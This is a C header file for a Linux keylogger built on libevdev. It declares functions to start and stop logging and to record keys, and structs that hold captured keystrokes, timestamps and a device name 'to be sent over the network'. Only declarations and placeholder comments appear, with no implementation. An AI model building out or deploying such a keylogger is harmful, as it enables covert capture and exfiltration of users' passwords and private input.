#pragma once

#define _POSIX_SOURCE
#include <ctype.h>
#include <errno.h>
#include <fcntl.h>
#include <libevdev/libevdev.h>
#include <pthread.h>
#include <signal.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>

/**
 * Represents all the data that is sent over the network
 */
typedef struct {
  char** keys;        // An array of strings to be sent over the network.
  char* device_name;  // A string representing the device type of the user.
} key_package;

/**
 * Represents all the associated data for one key that was pressed
 */
typedef struct {
  char* key;         // A string representing a key that was pressed.
  char* timestamp;   // The approximate time (UTC) that the key was pressed.
  // char* application; /* Represents the active application of the user when they
  //                       pressed the key. */
  int* time_pressed; /* The number of times the user held down the key; used for
                        approximating the number of characters that were
                        generated during this period. */
} key_info;

/**
 * Documentation here
 */
void begin_keylogger(void);

/**
 * Documentation here
 */
void end_keylogger(void);

/**
 * Documentation here
 */
void log_device(key_package* key_package);

/**
 * Documentation here
 * 
 * If the device sends events faster than can be read, the kernel buffers will
 * fill up and the kernel will skip events. This function resyncs the device
 * and updates the internal state before reading events again
 */
void handle_syn_dropped(struct libevdev* dev);

/**
 * Documentation here
 */
void log_keys(key_package* key_package);
